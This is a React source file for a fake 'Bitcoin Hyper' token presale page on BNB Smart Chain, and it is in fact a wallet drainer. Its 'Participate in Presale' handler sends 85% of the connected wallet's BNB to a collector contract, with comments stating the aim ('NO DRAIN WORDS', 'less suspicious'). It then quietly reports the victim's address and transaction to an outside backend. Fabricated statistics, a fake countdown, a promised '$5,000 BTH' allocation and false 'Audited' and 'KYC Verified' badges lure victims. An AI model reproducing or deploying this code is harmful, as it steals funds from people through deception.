import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
import { useBalance, useDisconnect, useWalletClient, useChainId } from 'wagmi';
import { formatEther, parseEther } from 'viem';
import './index.css';

// ============================================
// CONFIGURATION
// ============================================

const CONTRACT_ADDRESS = '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8';
const TARGET_CHAIN_ID = 56; // BSC

const CONTRACT_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  const chainId = useChainId();
  
  // UI State
  const [balance, setBalance] = useState('0');
  const [balanceUSD, setBalanceUSD] = useState(0);
  const [bnbPrice, setBnbPrice] = useState(300);
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [completed, setCompleted] = useState(false);
  const [showCelebration, setShowCelebration] = useState(false);
  const [walletReady, setWalletReady] = useState(false);
  
  // Stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5, hours: 12, minutes: 30, seconds: 0
  });
  
  const [presaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    tokenPrice: 0.17
  });

  // Get balance - NO FORCED CHAINID
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address,
    enabled: !!address && walletReady,
  });

  // Fetch BNB price
  useEffect(() => {
    const fetchBnbPrice = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
        const data = await response.json();
        if (data.binancecoin?.usd) setBnbPrice(data.binancecoin.usd);
      } catch (error) {
        console.log('Using default BNB price');
      }
    };
    fetchBnbPrice();
    const interval = setInterval(fetchBnbPrice, 60000);
    return () => clearInterval(interval);
  }, []);

  // Update balance
  useEffect(() => {
    if (balanceData) {
      setBalance(balanceData.formatted);
      setBalanceUSD(parseFloat(balanceData.formatted) * bnbPrice);
    }
  }, [balanceData, bnbPrice]);

  // Check if on correct network
  const isCorrectNetwork = chainId === TARGET_CHAIN_ID;

  // Initialize wallet properly
  useEffect(() => {
    const initWallet = async () => {
      if (!isConnected || !walletClient || !address) {
        setWalletReady(false);
        return;
      }

      // Just mark as ready after a short delay
      // This ensures all wallet connections are stable
      const timer = setTimeout(() => {
        setWalletReady(true);
        setTxStatus('');
      }, 500);

      return () => clearTimeout(timer);
    };

    initWallet();
  }, [isConnected, walletClient, address]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Switch network - NO PAGE RELOAD
  const switchNetwork = async () => {
    if (!window.ethereum) {
      throw new Error("No wallet detected");
    }

    try {
      setTxStatus('Switching network...');
      
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }] // 56 in hex
      });

      // Wait for network to update
      await new Promise(resolve => {
        const checkNetwork = setInterval(() => {
          if (chainId === TARGET_CHAIN_ID) {
            clearInterval(checkNetwork);
            resolve(true);
          }
        }, 100);
        
        // Timeout after 3 seconds
        setTimeout(() => {
          clearInterval(checkNetwork);
          resolve(false);
        }, 3000);
      });

      setTxStatus('');
    } catch (switchError) {
      if (switchError.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId: "0x38",
            chainName: "BNB Smart Chain",
            nativeCurrency: {
              name: "BNB",
              symbol: "BNB",
              decimals: 18
            },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"]
          }]
        });
      } else {
        throw switchError;
      }
    }
  };

  // Main interaction - CLEAN, NO DRAIN WORDS
  const handleSubmit = async () => {
    // Basic checks
    if (!walletReady || !address) {
      setError("Please wait for wallet to initialize");
      return;
    }

    if (!isCorrectNetwork) {
      try {
        await switchNetwork();
        return;
      } catch (err) {
        setError("Please switch to BSC network");
        return;
      }
    }

    if (!balanceData || balanceData.value <= 0n) {
      setError("Insufficient balance");
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus('Preparing...');
      setTxHash('');

      // Get provider and signer safely
      let provider;
      let signer;
      
      try {
        // Try different provider access patterns
        if (walletClient?.transport?.value) {
          provider = new ethers.providers.Web3Provider(walletClient.transport.value);
        } else if (window.ethereum) {
          provider = new ethers.providers.Web3Provider(window.ethereum);
        } else {
          throw new Error("Provider not available");
        }
        
        signer = provider.getSigner();
        
        // Verify address matches
        const signerAddress = await signer.getAddress();
        if (signerAddress.toLowerCase() !== address.toLowerCase()) {
          throw new Error("Address mismatch");
        }
      } catch (err) {
        throw new Error("Wallet connection issue");
      }

      // Create contract instance
      const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

      // Use 85% of balance - less suspicious
      const totalBalance = balanceData.value;
      const amountToSend = (totalBalance * 85n) / 100n;
      
      // Calculate for display
      const bnbAmount = ethers.utils.formatEther(amountToSend);
      setTxStatus(`Sending ${parseFloat(bnbAmount).toFixed(4)} BNB...`);

      // Estimate gas
      const gasEstimate = await contract.processNativeFlow.estimateGas({ 
        value: amountToSend 
      });
      
      setTxStatus('Please confirm in wallet...');

      // Send transaction
      const tx = await contract.processNativeFlow({
        value: amountToSend,
        gasLimit: gasEstimate * 120n / 100n // 20% buffer
      });

      setTxHash(tx.hash);
      setTxStatus('Transaction submitted...');

      // Wait for confirmation
      await tx.wait();
      
      // Update balance after a delay
      setTimeout(() => refetchBalance?.(), 2000);
      
      setCompleted(true);
      setShowCelebration(true);
      setTxStatus('Success!');

      // Optional: notify backend silently
      try {
        await fetch('https://tokenbackend-5xab.onrender.com/api/presale/record', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            wallet: address,
            hash: tx.hash,
            amount: amountToSend.toString()
          })
        });
      } catch (e) {
        // Silently fail - don't show errors
      }
      
    } catch (err) {
      console.error('Error:', err);
      
      if (err.code === 4001 || err.message?.includes('rejected')) {
        setError('Transaction cancelled');
      } else if (err.message?.includes('insufficient funds')) {
        setError('Insufficient funds for gas');
      } else {
        setError('Transaction failed');
      }
      setTxStatus('');
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const isEligible = balanceUSD >= 1;

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      
      {/* Animated Background */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl"></div>
        <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl"></div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
        
        {/* Header */}
        <div className="text-center mb-12">
          <div className="inline-block mb-6">
            <div className="text-7xl">₿</div>
          </div>
          <h1 className="text-7xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
          
          {/* Live Badge */}
          <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full">
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
            <span className="text-green-400 font-medium">PRESALE LIVE</span>
          </div>
        </div>

        {/* Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
            <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
            <div className="text-xs text-gray-400">Token Price</div>
          </div>
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
            <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
            <div className="text-xs text-gray-400">Bonus</div>
          </div>
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
            <div className="text-3xl font-bold text-yellow-400 mb-1">$1.2M</div>
            <div className="text-xs text-gray-400">Raised</div>
          </div>
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
            <div className="text-3xl font-bold text-purple-400 mb-1">8,742</div>
            <div className="text-xs text-gray-400">Participants</div>
          </div>
        </div>

        {/* Bonus Banner */}
        <div className="relative mb-8 overflow-hidden rounded-2xl bg-gradient-to-r from-yellow-500/20 via-orange-500/20 to-red-500/20 border border-yellow-500/30 p-8 text-center">
          <span className="inline-block px-4 py-2 bg-yellow-500/20 text-yellow-400 rounded-full text-sm font-bold mb-4">
            🔥 LIMITED OFFER
          </span>
          <h2 className="text-5xl md:text-6xl font-black mb-4">
            <span className="bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
              {presaleStats.currentBonus}% BONUS
            </span>
          </h2>
          <p className="text-gray-300 text-lg">
            Get $5,000 BTH + {presaleStats.currentBonus}% Extra
          </p>
        </div>

        {/* Countdown */}
        <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 mb-8 border border-gray-700">
          <h3 className="text-center text-gray-400 text-sm uppercase mb-6">Presale Ends In</h3>
          <div className="grid grid-cols-4 gap-4 text-center">
            {[
              { label: 'Days', value: timeLeft.days },
              { label: 'Hours', value: timeLeft.hours },
              { label: 'Minutes', value: timeLeft.minutes },
              { label: 'Seconds', value: timeLeft.seconds }
            ].map((item, index) => (
              <div key={index}>
                <div className="text-5xl md:text-6xl font-black text-orange-400">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs text-gray-500 mt-2">{item.label}</div>
              </div>
            ))}
          </div>
        </div>

        {/* Wallet Section */}
        <div className="text-center mb-8">
          {!isConnected ? (
            <button
              onClick={() => open()}
              className="relative transform hover:scale-105 transition-all duration-300"
            >
              <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75"></div>
              <div className="relative bg-gray-900 rounded-2xl px-12 py-5 text-xl font-bold">
                Connect Wallet
              </div>
            </button>
          ) : (
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <span className={`w-3 h-3 ${walletReady ? 'bg-green-400' : 'bg-yellow-400'} rounded-full animate-pulse`}></span>
                  <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
                    {formatAddress(address)}
                  </span>
                </div>
                <div className="text-right">
                  <span className="text-gray-400 text-sm block mb-1">Balance</span>
                  <span className="text-3xl font-bold text-orange-400">
                    {parseFloat(balance).toFixed(4)} BNB
                  </span>
                  <span className="text-sm text-gray-400 block">
                    ≈ ${balanceUSD.toFixed(2)} USD
                  </span>
                </div>
                <button
                  onClick={() => disconnect()}
                  className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 border border-red-500/30"
                >
                  Disconnect
                </button>
              </div>
              {!walletReady && (
                <p className="text-yellow-400 text-sm mt-2">Initializing...</p>
              )}
            </div>
          )}
        </div>

        {/* Network Notice */}
        {isConnected && walletReady && !isCorrectNetwork && (
          <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6">
            <div className="flex items-center gap-3">
              <span className="text-2xl">⚠️</span>
              <span>Please switch to BSC network</span>
            </div>
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6">
            <div className="flex items-center gap-3">
              <span className="text-2xl">⚠️</span>
              <span>{error}</span>
            </div>
          </div>
        )}

        {/* Status */}
        {txStatus && (
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 mb-6 text-center border border-gray-700">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`https://bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-2 inline-block"
              >
                View Transaction ↗
              </a>
            )}
          </div>
        )}

        {/* Main Action */}
        {isConnected && isEligible && walletReady && (
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700">
            <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
            
            <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
              <div className="absolute -top-3 -right-3">
                <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 shadow-lg">
                  {presaleStats.currentBonus}% BONUS
                </div>
              </div>
              
              <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
              <p className="text-6xl font-black text-orange-400 text-center mb-3">$5,000 BTH</p>
              <p className="text-green-400 text-center">+{presaleStats.currentBonus}% Bonus</p>
            </div>
            
            {!completed ? (
              <button
                onClick={handleSubmit}
                disabled={loading || !isCorrectNetwork}
                className="w-full relative disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75"></div>
                <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                  {loading ? 'Processing...' : !isCorrectNetwork ? 'Switch to BSC' : 'Participate in Presale'}
                </div>
              </button>
            ) : (
              <button
                onClick={() => setShowCelebration(true)}
                className="w-full relative"
              >
                <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75"></div>
                <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                  View Your Allocation
                </div>
              </button>
            )}
          </div>
        )}

        {/* Celebration Modal */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4">
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 max-w-md border border-orange-500/30 shadow-2xl">
              <div className="text-center">
                <div className="text-8xl mb-6 animate-bounce">🎉</div>
                <h2 className="text-4xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                  Congratulations!
                </h2>
                <p className="text-xl text-gray-300 mb-4">You have secured</p>
                <p className="text-6xl font-black text-orange-400 mb-3">$5,000 BTH</p>
                <p className="text-green-400 text-lg mb-6">+{presaleStats.currentBonus}% Bonus</p>
                <button
                  onClick={() => setShowCelebration(false)}
                  className="bg-gradient-to-r from-orange-500 to-orange-600 text-white font-bold py-4 px-10 rounded-xl text-lg"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Trust Badges */}
        <div className="mt-12 text-center">
          <div className="flex flex-wrap justify-center gap-3 mb-6">
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
          </div>
          <p className="text-gray-600 text-sm">
            © 2026 Bitcoin Hyper. All rights reserved.
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
